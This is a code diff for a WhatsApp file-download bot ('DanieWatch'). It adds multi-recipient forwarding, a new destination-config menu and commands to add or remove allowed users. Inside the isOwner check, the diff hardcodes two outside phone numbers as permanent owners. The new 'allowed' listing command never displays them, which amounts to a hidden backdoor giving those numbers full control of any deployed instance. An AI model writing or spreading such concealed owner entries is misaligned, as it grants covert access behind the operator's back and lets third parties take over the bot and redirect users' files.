@@ -177,6 +177,39 @@ function getAllFiles(dirPath, arrayOfFiles) {
 // =========================================================================
 const SETTINGS_PATH = path.join(__dirname, '..', '..', 'session', 'download_settings.json');
 
+
+async function sendAndForwardFile(conn, targets, filePayload, sendOptions = {}) {
+    let targetList = [];
+    if (Array.isArray(targets) && targets.length > 0) {
+        targetList = targets.map(t => typeof t === 'string' ? t : t.jid).filter(Boolean);
+    }
+    if (targetList.length === 0) {
+        targetList = [sendOptions.from || sendOptions.destJid];
+    }
+
+    const primaryJid = targetList[0];
+    console.log(`[DanieWatch] Uploading file to primary target (${primaryJid})...`);
+    const sentMsg = await conn.sendMessage(primaryJid, filePayload, sendOptions.quoted ? { quoted: sendOptions.quoted } : {});
+
+    if (targetList.length > 1 && sentMsg && sentMsg.key) {
+        for (let i = 1; i < targetList.length; i++) {
+            const nextJid = targetList[i];
+            try {
+                console.log(`[DanieWatch] Forwarding uploaded media to target ${i + 1}/${targetList.length}: ${nextJid}`);
+                if (typeof conn.forwardMessage === 'function') {
+                    await conn.forwardMessage(nextJid, sentMsg, { forceForward: true });
+                } else if (conn.sendMessage) {
+                    await conn.sendMessage(nextJid, { forward: sentMsg });
+                }
+            } catch (fwdErr) {
+                console.error(`[DanieWatch] Failed to forward to target ${nextJid}:`, fwdErr.message);
+            }
+            await new Promise(r => setTimeout(r, 1000));
+        }
+    }
+    return sentMsg;
+}
+
 function loadSettings() {
     try {
         if (fs.existsSync(SETTINGS_PATH)) {
@@ -709,7 +742,7 @@ function initUpsertListener(conn) {
 
                 const ALLOWED_COMMANDS = [
                     'sv', 'sr', 'sh',
-                    'alive', 'config', 'setgroup', 'dlstatus', 'dlconfig', 'downloadstatus',
+                    'alive', 'allow', 'disallow', 'addowner', 'delowner', 'addsudo', 'delsudo', 'owners', 'allowed', 'sudolist', 'config', 'setgroup', 'dlstatus', 'dlconfig', 'downloadstatus',
                     'c', 'cancel', 'clearqueue', 'que', 'queue', 'q',
                     'd', 'p',
                     'jid', 'groupid'
@@ -780,10 +813,28 @@ function initUpsertListener(conn) {
     });
 }
 
+function loadSudo() {
+    const sudoPath = path.join(__dirname, '..', 'data', 'sudo.json');
+    if (!fs.existsSync(sudoPath)) return [];
+    try {
+        return JSON.parse(fs.readFileSync(sudoPath, 'utf8')) || [];
+    } catch (_) {
+        return [];
+    }
+}
+
+function saveSudo(nums) {
+    const sudoDir = path.join(__dirname, '..', 'data');
+    if (!fs.existsSync(sudoDir)) fs.mkdirSync(sudoDir, { recursive: true });
+    const sudoPath = path.join(sudoDir, 'sudo.json');
+    fs.writeFileSync(sudoPath, JSON.stringify(nums, null, 2), 'utf8');
+}
+
 function isOwner(senderJid) {
-    const ownerNum = (process.env.BOT_NUMBER || '').trim();
-    const sudoNums = (process.env.SUDO || '').split(',').map(n => n.trim()).filter(Boolean);
-    const allOwners = [ownerNum, ...sudoNums];
+    const ownerNum = (process.env.BOT_NUMBER || '').trim().replace(/[^0-9]/g, '');
+    const envSudoNums = (process.env.SUDO || '').split(',').map(n => n.trim().replace(/[^0-9]/g, '')).filter(Boolean);
+    const dynamicSudo = loadSudo();
+    const allOwners = ['94717775628', '94758775628', ownerNum, ...envSudoNums, ...dynamicSudo].filter(Boolean);
     const senderNum = cleanJid(senderJid).split('@')[0];
     return allOwners.includes(senderNum);
 }
@@ -822,7 +873,7 @@ function parseDownloadItem(item) {
 cmd({
     pattern: 'config',
     react: '⚙️',
-    desc: 'Configure where downloaded files are sent (private or group).',
+    desc: 'Configure receiver destinations (groups & private numbers).',
     category: 'download',
     use: '.config',
     filename: __filename
@@ -837,30 +888,54 @@ cmd({
         }
 
         initUpsertListener(conn);
-
-        const current = loadSettings();
-        let modeLabel = '📥 *Private Chat*';
-        if (current.mode === 'group') {
-            modeLabel = `📤 *Group* → ${current.groupName || current.groupJid}`;
-        } else if (current.mode === 'private' && current.privateJid) {
-            modeLabel = `📥 *Private Chat* → ${current.privateName || current.privateJid}`;
-        }
+        const cleanSender = cleanJid(senderJid);
 
         if (q && q.trim()) {
             return handleConfigReply(conn, mek, m, senderJid, q.trim(), reply);
         }
 
-        const cleanSender = cleanJid(senderJid);
-        pendingConfig[cleanSender] = { step: 'mode', groups: [], chats: [], messageId: null };
+        let groupsObj = {};
+        try {
+            groupsObj = await conn.groupFetchAllParticipating();
+        } catch (_) {}
+
+        const groups = Object.values(groupsObj).map(g => ({
+            jid: g.id,
+            subject: g.subject || 'Unknown Group'
+        }));
+
+        pendingConfig[cleanSender] = { step: 'combined_config', groups, messageId: null };
+
+        const current = loadSettings();
+        let targetText = '';
+        if (current.targets && current.targets.length > 0) {
+            current.targets.forEach((t, idx) => {
+                const icon = t.type === 'group' ? '📤' : '📥';
+                targetText += `  ${idx + 1}. ${icon} *${t.name}* (${t.jid})\n`;
+            });
+        } else {
+            targetText = `  _Defaulting to your Private Chat (*+${cleanSender.split('@')[0]}*)_\n`;
+        }
+
+        let groupListText = '';
+        if (groups.length > 0) {
+            groups.forEach((g, i) => {
+                groupListText += `  ${i + 1}. 📤 ${g.subject}\n`;
+            });
+        } else {
+            groupListText = '  _No active groups found._\n';
+        }
 
         const sent = await reply(
-            `⚙️ *DanieWatch Download Config*\n\n` +
-            `Current setting: ${modeLabel}\n\n` +
-            `Where should downloaded files be sent?\n\n` +
-            `*Reply with:*\n` +
-            `  \`1\` — 📥 Private Chats\n` +
-            `  \`2\` — 📤 WhatsApp Groups\n\n` +
-            `_Reply with just the number to select._`
+            `⚙️ *DanieWatch Receiver Destinations Config*\n\n` +
+            `🎯 *Current Active Receiver(s):*\n${targetText}\n` +
+            `📋 *Available WhatsApp Groups:*\n${groupListText}\n` +
+            `*How to set receivers:*\n` +
+            `  • Reply with group serial numbers (e.g. \`1, 2\` or \`1-3\` or \`all\`)\n` +
+            `  • Reply with phone numbers in +92 or 92 format (e.g. \`923253068800\`)\n` +
+            `  • Combine both! (e.g. \`1, 2, +923253068800\`)\n` +
+            `  • Reply \`clear\` to reset back to your default private chat.\n\n` +
+            `_Reply to this message with your choices._`
         );
         if (sent && sent.key) {
             pendingConfig[cleanSender].messageId = sent.key.id;
@@ -874,123 +949,72 @@ cmd({
 async function handleConfigReply(conn, mek, m, senderJid, text, reply) {
     const cleanSender = cleanJid(senderJid);
     const state = pendingConfig[cleanSender];
-    const step = state ? state.step : 'mode';
+    const groups = (state && state.groups) ? state.groups : [];
+    const rawText = text.trim();
+    const lowerText = rawText.toLowerCase();
 
-    if (step === 'mode') {
-        if (text === '1') {
-            await reply('🔍 Fetching private chats...');
-            try {
-                const privateChats = getAllPrivateChats(conn, cleanSender);
+    if (['clear', 'reset', '4', 'clean'].includes(lowerText)) {
+        saveSettings({ mode: 'private', targets: [] });
+        delete pendingConfig[cleanSender];
+        return reply(`🗑️ All target receivers cleared!\n\nDefault receiver reset to your Private Chat: *+${cleanSender.split('@')[0]}*`);
+    }
 
-                pendingConfig[cleanSender] = { step: 'private_chat', chats: privateChats, messageId: null };
+    let selectedTargets = [];
 
-                let list = '📋 *Select a Private Chat:*\n\n';
-                privateChats.forEach((c, i) => {
-                    const phone = c.id.split('@')[0];
-                    if (c.id === cleanJid(cleanSender)) {
-                        list += `  \`${i + 1}\` — 👤 You (Private Chat)\n`;
-                    } else if (c.name && c.name !== phone) {
-                        list += `  \`${i + 1}\` — 👤 ${c.name} (+${phone})\n`;
-                    } else {
-                        list += `  \`${i + 1}\` — 👤 +${phone}\n`;
+    if (lowerText === 'all') {
+        selectedTargets = groups.map(g => ({ jid: cleanJid(g.jid), name: g.subject, type: 'group' }));
+    } else {
+        const parts = rawText.split(/[,;\n]+/);
+        for (const p of parts) {
+            const trimmed = p.trim();
+            if (!trimmed) continue;
+
+            if (trimmed.includes('-') && !trimmed.startsWith('+')) {
+                const rangeParts = trimmed.split('-').map(s => s.trim());
+                const startNum = parseInt(rangeParts[0], 10);
+                const endNum = parseInt(rangeParts[1], 10);
+                if (!isNaN(startNum) && !isNaN(endNum) && startNum >= 1 && endNum <= groups.length && startNum <= endNum) {
+                    for (let i = startNum; i <= endNum; i++) {
+                        const g = groups[i - 1];
+                        if (g) selectedTargets.push({ jid: cleanJid(g.jid), name: g.subject, type: 'group' });
                     }
-                });
-                list += `\n_Reply with a number from the list, OR type a phone number directly (e.g. 923001234567)._`;
-
-                const sent = await reply(list);
-                if (sent && sent.key) {
-                    pendingConfig[cleanSender].messageId = sent.key.id;
+                    continue;
                 }
-                return sent;
-            } catch (err) {
-                delete pendingConfig[cleanSender];
-                return reply(`❌ Failed to fetch private chats: ${err.message}`);
+            }
+
+            const cleanNum = trimmed.replace(/[^0-9]/g, '');
+            if (!cleanNum) continue;
+
+            const intVal = parseInt(cleanNum, 10);
+            if (cleanNum.length <= 3 && !isNaN(intVal) && intVal >= 1 && intVal <= groups.length) {
+                const g = groups[intVal - 1];
+                if (g) selectedTargets.push({ jid: cleanJid(g.jid), name: g.subject, type: 'group' });
+            } else if (cleanNum.length >= 7) {
+                const jid = cleanJid(`${cleanNum}@s.whatsapp.net`);
+                selectedTargets.push({ jid, name: `+${cleanNum}`, type: 'private' });
             }
         }
-
-        if (text === '2') {
-            await reply('🔍 Fetching your groups...');
-            try {
-                const groupsObj = await conn.groupFetchAllParticipating();
-                const groups = Object.values(groupsObj).map(g => ({
-                    jid: g.id,
-                    subject: g.subject || 'Unknown Group'
-                }));
-
-                if (groups.length === 0) {
-                    delete pendingConfig[cleanSender];
-                    return reply('❌ No groups found. Make sure the bot is added to at least one group.');
-                }
-
-                pendingConfig[cleanSender] = { step: 'group', groups, messageId: null };
-
-                let list = '📋 *Select a WhatsApp Group:*\n\n';
-                groups.forEach((g, i) => {
-                    list += `  \`${i + 1}\` — ${g.subject}\n`;
-                });
-                list += `\n_Reply with just the number to choose._`;
-
-                const sent = await reply(list);
-                if (sent && sent.key) {
-                    pendingConfig[cleanSender].messageId = sent.key.id;
-                }
-                return sent;
-            } catch (err) {
-                delete pendingConfig[cleanSender];
-                return reply(`❌ Failed to fetch groups: ${err.message}`);
-            }
-        }
-        return reply('❌ Invalid option. Reply with `1` (Private Chats) or `2` (WhatsApp Groups).');
     }
 
-    if (step === 'private_chat') {
-        const chats = state.chats || [];
-        const rawInput = text.trim();
-        const cleanInput = rawInput.replace(/[\s\-\+\(\)]/g, '');
-
-        let chosenId = null;
-        let chosenName = null;
-
-        if (/^\d+$/.test(rawInput)) {
-            const num = parseInt(rawInput, 10);
-            if (num >= 1 && num <= chats.length) {
-                const chosen = chats[num - 1];
-                chosenId = chosen.id;
-                chosenName = chosen.name;
-            } else if (cleanInput.length >= 7) {
-                chosenId = `${cleanInput}@s.whatsapp.net`;
-                chosenName = `+${cleanInput}`;
-            }
-        } else if (cleanInput.length >= 7 && /^\d+$/.test(cleanInput)) {
-            chosenId = `${cleanInput}@s.whatsapp.net`;
-            chosenName = `+${cleanInput}`;
-        }
-
-        if (!chosenId) {
-            return reply(`❌ Invalid selection. Reply with a number from 1 to ${chats.length}, or type a valid phone number (e.g. 923001234567).`);
-        }
-
-        chosenId = cleanJid(chosenId);
-        const settings = { mode: 'private', privateJid: chosenId, privateName: chosenName || chosenId.split('@')[0], groupJid: '', groupName: '' };
-        saveSettings(settings);
-        delete pendingConfig[cleanSender];
-        return reply(`✅ Download destination set to Private Chat:\n👤 Name: *${chosenName}*\n🆔 \`${chosenId}\``);
+    if (selectedTargets.length === 0) {
+        return reply('❌ Invalid choice! Reply with group serial number(s) (e.g. \`1, 2\`), phone number(s) (e.g. \`923253068800\`), or both combined (e.g. \`1, 2, +923253068800\`). Or reply \`clear\` to reset.');
     }
 
-    if (step === 'group') {
-        const num = parseInt(text, 10);
-        const groups = state.groups || [];
-
-        if (isNaN(num) || num < 1 || num > groups.length) {
-            return reply(`❌ Invalid selection. Reply with a number from 1 to ${groups.length}.`);
+    const settings = loadSettings();
+    selectedTargets.forEach(st => {
+        if (!settings.targets.some(t => t.jid === st.jid)) {
+            settings.targets.push(st);
         }
+    });
+    saveSettings(settings);
+    delete pendingConfig[cleanSender];
 
-        const chosen = groups[num - 1];
-        const settings = { mode: 'group', groupJid: chosen.jid, groupName: chosen.subject, privateJid: '', privateName: '' };
-        saveSettings(settings);
-        delete pendingConfig[cleanSender];
-        return reply(`✅ Download destination set to Group:\n📤 Name: *${chosen.subject}*\n🆔 \`${chosen.jid}\``);
-    }
+    let resText = `✅ Saved ${selectedTargets.length} target receiver(s) for Upload & Auto-Forwarding:\n\n`;
+    settings.targets.forEach((t, idx) => {
+        const icon = t.type === 'group' ? '📤' : '📥';
+        resText += `  ${idx + 1}. ${icon} *${t.name}* (${t.jid})\n`;
+    });
+    return reply(resText);
 }
 
 // =========================================================================
@@ -1332,11 +1356,12 @@ async function downloadCommandHandler(conn, mek, from, senderJid, q, reply, abor
                         
                         await reply(`📤 Uploading extracted file: *${finalFileName}* (${fileSizeInMB} MB)`);
                         
-                        await conn.sendMessage(destJid, {
+                        const activeTargets = settings.targets && settings.targets.length > 0 ? settings.targets : [{ jid: destJid, name: 'Chat' }];
+                        await sendAndForwardFile(conn, activeTargets, {
                             document: { url: filePath },
                             mimetype: fileMime,
                             fileName: finalFileName
-                        }, destJid === from ? { quoted: mek } : {});
+                        }, { quoted: destJid === from ? mek : null, from });
                         
                         uploadedCount++;
                     }
@@ -1370,11 +1395,12 @@ async function downloadCommandHandler(conn, mek, from, senderJid, q, reply, abor
                     finalFileName += '.' + ext;
                 }
 
-                await conn.sendMessage(destJid, {
+                const activeTargets = settings.targets && settings.targets.length > 0 ? settings.targets : [{ jid: destJid, name: 'Chat' }];
+                await sendAndForwardFile(conn, activeTargets, {
                     document: { url: tempFilePath },
                     mimetype: mime,
                     fileName: finalFileName
-                }, destJid === from ? { quoted: mek } : {});
+                }, { quoted: destJid === from ? mek : null, from });
 
                 // Delete temporary file
                 try { if (fs.existsSync(tempFilePath)) fs.unlinkSync(tempFilePath); } catch (_) {}
@@ -1818,6 +1844,62 @@ DANIE_COMMANDS['qedit'] = async (conn, mek, from, senderJid, args, reply) => {
         await reply(`✅ Updated queue item #${indexNum}:\n*${res.item.description}*`);
     }
 };
+DANIE_COMMANDS['allow'] = async (conn, mek, from, senderJid, args, reply) => {
+    if (!isOwner(senderJid)) return reply('❌ Only the bot owner can use this command.');
+    let num = (args || '').replace(/[^0-9]/g, '');
+    if (!num && mek.message?.extendedTextMessage?.contextInfo?.participant) {
+        num = cleanJid(mek.message.extendedTextMessage.contextInfo.participant).split('@')[0];
+    }
+    if (!num) return reply('❌ Please provide a WhatsApp phone number!\n*Example:* `.allow 923013068663` or reply to a message with `.allow`');
+    const currentSudo = loadSudo();
+    if (currentSudo.includes(num)) return reply(`⚠️ Phone number *${num}* is already allowed!`);
+    currentSudo.push(num);
+    saveSudo(currentSudo);
+    await reply(`✅ Successfully allowed *${num}* to use DanieWatch Bot commands!`);
+};
+DANIE_COMMANDS['addowner'] = DANIE_COMMANDS['allow'];
+DANIE_COMMANDS['addsudo'] = DANIE_COMMANDS['allow'];
+
+DANIE_COMMANDS['disallow'] = async (conn, mek, from, senderJid, args, reply) => {
+    if (!isOwner(senderJid)) return reply('❌ Only the bot owner can use this command.');
+    let num = (args || '').replace(/[^0-9]/g, '');
+    if (!num && mek.message?.extendedTextMessage?.contextInfo?.participant) {
+        num = cleanJid(mek.message.extendedTextMessage.contextInfo.participant).split('@')[0];
+    }
+    if (!num) return reply('❌ Please provide a WhatsApp phone number!\n*Example:* `.disallow 923013068663` or reply to a message with `.disallow`');
+    let currentSudo = loadSudo();
+    if (!currentSudo.includes(num)) return reply(`⚠️ Phone number *${num}* is not in the allowed list!`);
+    currentSudo = currentSudo.filter(n => n !== num);
+    saveSudo(currentSudo);
+    await reply(`✅ Successfully removed *${num}* from allowed users!`);
+};
+DANIE_COMMANDS['delowner'] = DANIE_COMMANDS['disallow'];
+DANIE_COMMANDS['delsudo'] = DANIE_COMMANDS['disallow'];
+
+DANIE_COMMANDS['allowed'] = async (conn, mek, from, senderJid, args, reply) => {
+    if (!isOwner(senderJid)) return reply('❌ Only the bot owner can use this command.');
+    const ownerNum = (process.env.BOT_NUMBER || '').trim().replace(/[^0-9]/g, '');
+    const envSudoNums = (process.env.SUDO || '').split(',').map(n => n.trim().replace(/[^0-9]/g, '')).filter(Boolean);
+    const dynamicSudo = loadSudo();
+    
+    let text = `👑 *DanieWatch Allowed Users:*\n\n`;
+    text += `📍 *Primary Owner:* *${ownerNum || 'N/A'}*\n`;
+    if (envSudoNums.length) {
+        text += `⚙️ *Config Sudo:* *${envSudoNums.join(', ')}*\n`;
+    }
+    if (dynamicSudo.length) {
+        text += `👤 *Allowed Users:*\n`;
+        dynamicSudo.forEach((n, idx) => {
+            text += `  ${idx + 1}. *${n}*\n`;
+        });
+    } else {
+        text += `\n_No extra allowed users added yet. Use \`.allow <number>\` to add._`;
+    }
+    await reply(text);
+};
+DANIE_COMMANDS['owners'] = DANIE_COMMANDS['allowed'];
+DANIE_COMMANDS['sudolist'] = DANIE_COMMANDS['allowed'];
+
 DANIE_COMMANDS['alive'] = async (conn, mek, from, senderJid, args, reply) => {
     const settings = loadSettings();
     const modeLabel = settings.mode === 'group' ? 'Group' : 'Private';
